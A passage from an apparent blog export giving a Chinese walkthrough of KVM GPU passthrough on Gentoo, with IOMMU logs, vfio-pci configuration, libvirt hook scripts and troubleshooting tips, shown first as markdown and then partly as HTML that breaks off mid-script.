Passthrough (set via kernel command line)\n[    0.547978] pci 0000:00:01.0: Adding to iommu group 0\n[    0.547984] pci 0000:00:01.1: Adding to iommu group 1\n[    0.547991] pci 0000:00:01.2: Adding to iommu group 2\n[    0.547997] pci 0000:00:02.0: Adding to iommu group 3\n[    0.548004] pci 0000:00:03.0: Adding to iommu group 4\n[    0.548010] pci 0000:00:03.1: Adding to iommu group 5\n[    0.548016] pci 0000:00:04.0: Adding to iommu group 6\n[    0.548022] pci 0000:00:05.0: Adding to iommu group 7\n[    0.548029] pci 0000:00:07.0: Adding to iommu group 8\n[    0.548034] pci 0000:00:07.1: Adding to iommu group 9\n[    0.548040] pci 0000:00:08.0: Adding to iommu group 10\n[    0.548046] pci 0000:00:08.1: Adding to iommu group 11\n[    0.548054] pci 0000:00:14.0: Adding to iommu group 12\n[    0.548059] pci 0000:00:14.3: Adding to iommu group 12\n[    0.548075] pci 0000:00:18.0: Adding to iommu group 13\n[    0.548079] pci 0000:00:18.1: Adding to iommu group 13\n[    0.548084] pci 0000:00:18.2: Adding to iommu group 13\n[    0.548089] pci 0000:00:18.3: Adding to iommu group 13\n[    0.548093] pci 0000:00:18.4: Adding to iommu group 13\n[    0.548098] pci 0000:00:18.5: Adding to iommu group 13\n[    0.548102] pci 0000:00:18.6: Adding to iommu group 13\n[    0.548107] pci 0000:00:18.7: Adding to iommu group 13\n[    0.548112] pci 0000:01:00.0: Adding to iommu group 14\n[    0.548122] pci 0000:02:00.0: Adding to iommu group 15\n[    0.548128] pci 0000:02:00.1: Adding to iommu group 15\n[    0.548133] pci 0000:02:00.2: Adding to iommu group 15\n[    0.548136] pci 0000:03:00.0: Adding to iommu group 15\n[    0.548139] pci 0000:03:04.0: Adding to iommu group 15\n[    0.548142] pci 0000:03:08.0: Adding to iommu group 15\n[    0.548144] pci 0000:03:09.0: Adding to iommu group 15\n[    0.548147] pci 0000:05:00.0: Adding to iommu group 15\n[    0.548150] pci 0000:06:00.0: Adding to iommu group 15\n[    0.548153] pci 0000:07:00.0: Adding to iommu group 15\n[    0.548159] pci 0000:08:00.0: Adding to iommu group 16\n[    0.548165] pci 0000:09:00.0: Adding to iommu group 17\n[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18\n[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19\n[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20\n[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21\n[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22\n[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23\n[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24\n[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25\n[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26\n[    0.549234] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).\n```\n\n查看显卡相关信息：\n\n```bash\nshopt -s nullglob\nfor g in `find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V`; do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n\n# 结果\n\nIOMMU Group 16:\n        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)\nIOMMU Group 17:\n        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]\nIOMMU Group 18:\n        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)\nIOMMU Group 19:\n        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]\nIOMMU Group 20:\n        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]\nIOMMU Group 21:\n        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]\n```\n\n## 2.3 内核模块添加\n\n```bash\n# 配置ids内容\nworisur ~ # cat /etc/modprobe.d/vfio.conf\noptions vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479\noptions vfio-pci disable_idle_d3=1\noptions vfio-pci disable_vga=1\n```\n\n## 2.4 hook 脚本\n\n```bash\nworisur /etc/libvirt/hooks # cat qemu\n#!/bin/bash\nOBJECT=\"$1\"\nOPERATION=\"$2\"\n\nif [ $OBJECT == \"miloo\" ] || [ $OBJECT == \"mod\" ] || [ $OBJECT == \"work\" ]; then\n        case \"$OPERATION\" in\n                \"prepare\")\n                systemctl start libvirt-nosleep@\"$OBJECT\"  2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                /bin/vfio-startup.sh 2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                ;;\n\n            \"release\")\n                systemctl stop libvirt-nosleep@\"$OBJECT\"  2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                /bin/vfio-teardown.sh 2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                ;;\n        esac\nfi\n```\n\n```bash\nworisur /etc/libvirt/hooks # cat vfio-startup.sh\n#!/bin/bash\n# Helpful to read output when debugging\nset -x\n\nlong_delay=10\nmedium_delay=5\nshort_delay=1\necho \"Beginning of startup!\"\n\nfunction stop_display_manager_if_running {\n    # Stop dm using systemd\n    if command -v systemctl; then\n        if systemctl is-active --quiet \"$1.service\" ; then\n            echo $1 >> /tmp/vfio-store-display-manager\n            systemctl stop \"$1.service\"\n        fi\n\n        while systemctl is-active --quiet \"$1.service\" ; do\n            sleep \"${medium_delay}\"\n        done\n\n        return\n    fi\n\n    # Stop dm using runit\n    if command -v sv; then\n        if sv status $1 ; then\n            echo $1 >> /tmp/vfio-store-display-manager\n            sv stop $1\n        fi\n    fi\n}\n\n# Stop currently running display manager\nif test -e \"/tmp/vfio-store-display-manager\" ; then\n    rm -f /tmp/vfio-store-display-manager\nfi\n\nstop_display_manager_if_running gdm\nstop_display_manager_if_running display-manager\n\nsleep \"${medium_delay}\"\n\n# Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)\nif test -e \"/tmp/vfio-bound-consoles\" ; then\n    rm -f /tmp/vfio-bound-consoles\nfi\nfor (( i = 0; i < 16; i++))\ndo\n  if test -x /sys/class/vtconsole/vtcon${i}; then\n      if [ `cat /sys/class/vtconsole/vtcon${i}/name | grep -c \"frame buffer\"` \\\n           = 1 ]; then\n               echo 0 > /sys/class/vtconsole/vtcon${i}/bind\n           echo \"Unbinding console ${i}\"\n           echo $i >> /tmp/vfio-bound-consoles\n      fi\n  fi\ndone\n\n# Unbind EFI-Framebuffer\nif test -e \"/tmp/vfio-is-nvidia\" ; then\n    rm -f /tmp/vfio-is-nvidia\nfi\n\nif lsmod | grep \"nvidia\" &> /dev/null ; then\n    echo \"true\" >> /tmp/vfio-is-nvidia\n    echo efi-framebuffer.0 > /sys/bus/platform/drivers/efi-framebuffer/unbind\nfi\n\necho \"End of startup!\"\n```\n\n```bash\nworisur /etc/libvirt/hooks # cat vfio-teardown.sh\n#!/bin/bash\nset -x\n\necho \"Beginning of teardown!\"\n\nsleep 10\n\n# Restart Display Manager\ninput=\"/tmp/vfio-store-display-manager\"\nwhile read displayManager; do\n  if command -v systemctl; then\n    systemctl start \"$displayManager.service\"\n  else\n    if command -v sv; then\n      sv start $displayManager\n    fi\n  fi\ndone < \"$input\"\n\n# Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)\ninput=\"/tmp/vfio-bound-consoles\"\nwhile read consoleNumber; do\n  if test -x /sys/class/vtconsole/vtcon${consoleNumber}; then\n      if [ `cat /sys/class/vtconsole/vtcon${consoleNumber}/name | grep -c \"frame buffer\"` \\\n           = 1 ]; then\n    echo \"Rebinding console ${consoleNumber}\"\n          echo 1 > /sys/class/vtconsole/vtcon${consoleNumber}/bind\n      fi\n  fi\ndone < \"$input\"\n\n# Rebind framebuffer for nvidia\nif test -e \"/tmp/vfio-is-nvidia\" ; then\n  echo \"efi-framebuffer.0\" > /sys/bus/platform/drivers/efi-framebuffer/bind\nfi\n\necho \"End of teardown!\"\n```\n\n```bash\n# 权限为 kvm 用户 组为 libvirt\nworisur /etc/libvirt/hooks # ls -al\n总用量 20\ndrwxr-xr-x 2 miloo libvirt 4096  7月 14 23:35 .\ndrwxr-xr-x 7 root  root    4096  7月 13 01:25 ..\n-rwxr-xr-x 1 miloo libvirt  622  7月 14 23:32 qemu\n-rwxr-xr-x 1 miloo libvirt 1981  7月 13 02:06 vfio-startup.sh\n-rwxr-xr-x 1 miloo libvirt  972  7月 13 02:07 vfio-teardown.sh\n```\n\n## 2.5 QEMU 配置  \n\n```bash\n# /etc/libvirt/libvirtd.conf 修改如下行：\nworisur /etc/libvirt # cat libvirtd.conf\nunix_sock_group = \"libvirt\"\nunix_sock_rw_perms = \"0770\"\nlog_filters=\"1:qemu\"\nlog_outputs=\"1:file:/var/log/libvirt/libvirtd.log\"\n\n# # /etc/libvirt/qemu.conf 修改如下行：\nworisur /etc/libvirt # cat qemu.conf\nuser = \"miloo\"\ngroup = \"libvirt\"\n```\n\n# 3 直通\n\n## 3.1 创建不直通的虚拟机\n\n- 下载[驱动](https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md)\n- 芯片组：Q35\n- 固件：ovmf_code.fd\n\n## 3.2 vbios\n\n[gpuz提取](http://www.xiaobaixitong.com/help/43692.html)\n\n[此处下载](https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=)\n\n## 3.3 添加直通设备\n\n1. 打开虚拟机管理器,把显卡的所有pci部分都添加到虚拟机里面。\n> pci设备：1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479\n1. 启用XML编辑, 在显卡的所有pci设备里面, 在</source>之后添加: ```<rom bar=\"on\" file=\"vbios路径\"/>```\n2. 把串口,显示协议,信道,usb转接,显卡qxl,触摸板那些东西删掉\n3. 添加你的USB设备,比如鼠标、键盘和USB耳机。\n\n# 4 问题解决\n\n## 4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)\n\n- Pass the SMBIOS information to the guest\n- Pass the exact host's CPU model to the guest\n- Hide the \"hypervisor\" feature from the CPU\n- In the \"features > hyperv\" section, add a vendor_id\n- In the \"features\" section, hide kvm.\n\n```xml\n<os>\n  <smbios mode='host'/>\n  ...\n</os>\n...\n<features>\n  <hyperv>\n    ...\n    <vendor_id state='on' value='123456789ab'/>\n  </hyperv>\n  <kvm>\n    <hidden state='on'/>\n    <hint-dedicated state='on'/>\n  </kvm>\n  ...\n</features>\n...\n<cpu mode='host-passthrough'>\n  ...\n  <feature policy='disable' name='hypervisor'/>\n</cpu>\n```\n\n## 4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)\n\n- `ucsi_cgg` 为英伟达显卡的 `mod` 直接屏蔽就好\n\n```bash\n/etc/modprobe.d # cat blacklist-nvidia-usb.conf\nblacklist ucsi_ccg\n```\n\n## 4.2 docker 桥接占用物理网卡导致网络不通的情况\n\n- 添加或修改 `/etc/docker/daemon.json` 将 kvm 的桥接网卡直接赋给 docker\n\n```bash\n{\n  \"bridge\": \"virbr\",\n  \"default-gateway\": \"*.*.*.*\"\n}\n```\n","slug":"2022-07-14.kvm显卡直通","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b2000boqnadr2d65cz","content":"<ul>\n<li><a href=\"#1-%E5%AE%89%E8%A3%85\">1 安装</a></li>\n<li><a href=\"#2-%E9%85%8D%E7%BD%AE\">2 配置</a><ul>\n<li><a href=\"#21-%E6%A1%A5%E6%8E%A5\">2.1 桥接</a></li>\n<li><a href=\"#22-iommu\">2.2 iommu</a></li>\n<li><a href=\"#23-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%B7%BB%E5%8A%A0\">2.3 内核模块添加</a></li>\n<li><a href=\"#24-hook-%E8%84%9A%E6%9C%AC\">2.4 hook 脚本</a></li>\n<li><a href=\"#25-qemu-%E9%85%8D%E7%BD%AE\">2.5 QEMU 配置</a></li>\n</ul>\n</li>\n<li><a href=\"#3-%E7%9B%B4%E9%80%9A\">3 直通</a><ul>\n<li><a href=\"#31-%E5%88%9B%E5%BB%BA%E4%B8%8D%E7%9B%B4%E9%80%9A%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA\">3.1 创建不直通的虚拟机</a></li>\n<li><a href=\"#32-vbios\">3.2 vbios</a></li>\n<li><a href=\"#33-%E6%B7%BB%E5%8A%A0%E7%9B%B4%E9%80%9A%E8%AE%BE%E5%A4%87\">3.3 添加直通设备</a></li>\n</ul>\n</li>\n<li><a href=\"#4-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3\">4 问题解决</a><ul>\n<li><a href=\"#41-%E8%BD%AF%E4%BB%B6%E4%B8%8D%E8%83%BD%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Asorry-this-program-cannot-run-under-a-virtual-machine\">4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</a></li>\n<li><a href=\"#42-%E9%BB%91%E5%B1%8Fucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed\">4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</a></li>\n<li><a href=\"#42-docker-%E6%A1%A5%E6%8E%A5%E5%8D%A0%E7%94%A8%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1%E5%AF%BC%E8%87%B4%E7%BD%91%E7%BB%9C%E4%B8%8D%E9%80%9A%E7%9A%84%E6%83%85%E5%86%B5\">4.2 docker 桥接占用物理网卡导致网络不通的情况</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1 安装\"></a>1 安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br>sys-firmware/edk2-ovmf<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class=\"hljs-built_in\">enable</span> libvirtd<br>systemctl <span class=\"hljs-built_in\">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2 配置\"></a>2 配置</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur ~ <span class=\"hljs-comment\"># neofetch</span><br>         -/oyddmdhs+:.                root@worisur<br>     -odNMMMMMMMMNNmhy+-`             ------------<br>   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64<br> `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist<br> omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins<br>.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)<br> oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16<br>  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0<br>    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz<br>       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT<br>    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB<br>  `sNMMMMMMMMNNNmmmdddddmNMmhs/.<br> /NMMMMMMMMNNNNmmmdddmNMNdso:`<br>+MMMMMMMNNNNNmmmmdmNMNdso/-<br>yMMNNNNNNNmmmmmNNMmhs+/-`<br>/hMMNNNNNNNNMNdhs++/-`<br>`/ohdmmddhys+++/:.`<br>  `-//////:--.<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-1-桥接\"><a href=\"#2-1-桥接\" class=\"headerlink\" title=\"2.1 桥接\"></a>2.1 桥接</h2><p><a href=\"https://blog.51cto.com/u_3823536/2547591\">无线网卡看这里</a></p>\n<p><a href=\"https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html\">brctl配置看这里</a></p>\n<ul>\n<li>我的做法:</li>\n</ul>\n<p>NetworkManager 直接使用 <code>nmtui</code> 将需要桥接的网卡加进新建的网桥(并将该网卡的mac地址配置给网桥),然后给网桥配置静态的地址(配置方式和普通网卡没区别),设置开机启动</p>\n<h2 id=\"2-2-iommu\"><a href=\"#2-2-iommu\" class=\"headerlink\" title=\"2.2 iommu\"></a>2.2 iommu</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> /etc/default/grub<br><span class=\"hljs-comment\"># 添加如下行</span><br><span class=\"hljs-comment\"># AMD处理器(根据BIOS设置默认已启用？)：amd_iommu=on</span><br><span class=\"hljs-comment\"># 可视情况添加（修复或导致黑屏）：iommu=pt</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class=\"hljs-string\">&quot;amd_iommu=on iommu=pt&quot;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>重启后,看看启动日志检查一下IOMMU是否已启用,使用超级用户权限运行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur ~ <span class=\"hljs-comment\"># dmesg | grep -e DMAR -e iommu</span><br>[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.067146] Kernel <span class=\"hljs-built_in\">command</span> line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.531545] iommu: Default domain <span class=\"hljs-built_in\">type</span>: Passthrough (<span class=\"hljs-built_in\">set</span> via kernel <span class=\"hljs-built_in\">command</span> line)<br>[    0.547978] pci 0000:00:01.0: Adding to iommu group 0<br>[    0.547984] pci 0000:00:01.1: Adding to iommu group 1<br>[    0.547991] pci 0000:00:01.2: Adding to iommu group 2<br>[    0.547997] pci 0000:00:02.0: Adding to iommu group 3<br>[    0.548004] pci 0000:00:03.0: Adding to iommu group 4<br>[    0.548010] pci 0000:00:03.1: Adding to iommu group 5<br>[    0.548016] pci 0000:00:04.0: Adding to iommu group 6<br>[    0.548022] pci 0000:00:05.0: Adding to iommu group 7<br>[    0.548029] pci 0000:00:07.0: Adding to iommu group 8<br>[    0.548034] pci 0000:00:07.1: Adding to iommu group 9<br>[    0.548040] pci 0000:00:08.0: Adding to iommu group 10<br>[    0.548046] pci 0000:00:08.1: Adding to iommu group 11<br>[    0.548054] pci 0000:00:14.0: Adding to iommu group 12<br>[    0.548059] pci 0000:00:14.3: Adding to iommu group 12<br>[    0.548075] pci 0000:00:18.0: Adding to iommu group 13<br>[    0.548079] pci 0000:00:18.1: Adding to iommu group 13<br>[    0.548084] pci 0000:00:18.2: Adding to iommu group 13<br>[    0.548089] pci 0000:00:18.3: Adding to iommu group 13<br>[    0.548093] pci 0000:00:18.4: Adding to iommu group 13<br>[    0.548098] pci 0000:00:18.5: Adding to iommu group 13<br>[    0.548102] pci 0000:00:18.6: Adding to iommu group 13<br>[    0.548107] pci 0000:00:18.7: Adding to iommu group 13<br>[    0.548112] pci 0000:01:00.0: Adding to iommu group 14<br>[    0.548122] pci 0000:02:00.0: Adding to iommu group 15<br>[    0.548128] pci 0000:02:00.1: Adding to iommu group 15<br>[    0.548133] pci 0000:02:00.2: Adding to iommu group 15<br>[    0.548136] pci 0000:03:00.0: Adding to iommu group 15<br>[    0.548139] pci 0000:03:04.0: Adding to iommu group 15<br>[    0.548142] pci 0000:03:08.0: Adding to iommu group 15<br>[    0.548144] pci 0000:03:09.0: Adding to iommu group 15<br>[    0.548147] pci 0000:05:00.0: Adding to iommu group 15<br>[    0.548150] pci 0000:06:00.0: Adding to iommu group 15<br>[    0.548153] pci 0000:07:00.0: Adding to iommu group 15<br>[    0.548159] pci 0000:08:00.0: Adding to iommu group 16<br>[    0.548165] pci 0000:09:00.0: Adding to iommu group 17<br>[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18<br>[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19<br>[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20<br>[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21<br>[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22<br>[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23<br>[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24<br>[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25<br>[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26<br>[    0.549234] perf/amd_iommu: Detected AMD IOMMU <span class=\"hljs-comment\">#0 (2 banks, 4 counters/bank).</span><br></code></pre></td></tr></table></figure>\n\n<p>查看显卡相关信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">shopt</span> -s nullglob<br><span class=\"hljs-keyword\">for</span> g <span class=\"hljs-keyword\">in</span> `find /sys/kernel/iommu_groups/* -maxdepth 0 -<span class=\"hljs-built_in\">type</span> d | <span class=\"hljs-built_in\">sort</span> -V`; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;IOMMU Group <span class=\"hljs-variable\">$&#123;g##*/&#125;</span>:&quot;</span><br>    <span class=\"hljs-keyword\">for</span> d <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">$g</span>/devices/*; <span class=\"hljs-keyword\">do</span><br>        <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">&quot;\\t<span class=\"hljs-subst\">$(lspci -nns $&#123;d##*/&#125;)</span>&quot;</span><br>    <span class=\"hljs-keyword\">done</span>;<br><span class=\"hljs-keyword\">done</span>;<br><br><span class=\"hljs-comment\"># 结果</span><br><br>IOMMU Group 16:<br>        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)<br>IOMMU Group 17:<br>        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]<br>IOMMU Group 18:<br>        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)<br>IOMMU Group 19:<br>        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]<br>IOMMU Group 20:<br>        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]<br>IOMMU Group 21:<br>        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-内核模块添加\"><a href=\"#2-3-内核模块添加\" class=\"headerlink\" title=\"2.3 内核模块添加\"></a>2.3 内核模块添加</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 配置ids内容</span><br>worisur ~ <span class=\"hljs-comment\"># cat /etc/modprobe.d/vfio.conf</span><br>options vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479<br>options vfio-pci disable_idle_d3=1<br>options vfio-pci disable_vga=1<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-hook-脚本\"><a href=\"#2-4-hook-脚本\" class=\"headerlink\" title=\"2.4 hook 脚本\"></a>2.4 hook 脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat qemu</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br>OBJECT=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>&quot;</span><br>OPERATION=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$2</span>&quot;</span><br><br><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;miloo&quot;</span> ] || [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;mod&quot;</span> ] || [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;work&quot;</span> ]; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OPERATION</span>&quot;</span> <span class=\"hljs-keyword\">in</span><br>                <span class=\"hljs-string\">&quot;prepare&quot;</span>)<br>                systemctl start libvirt-nosleep@<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a 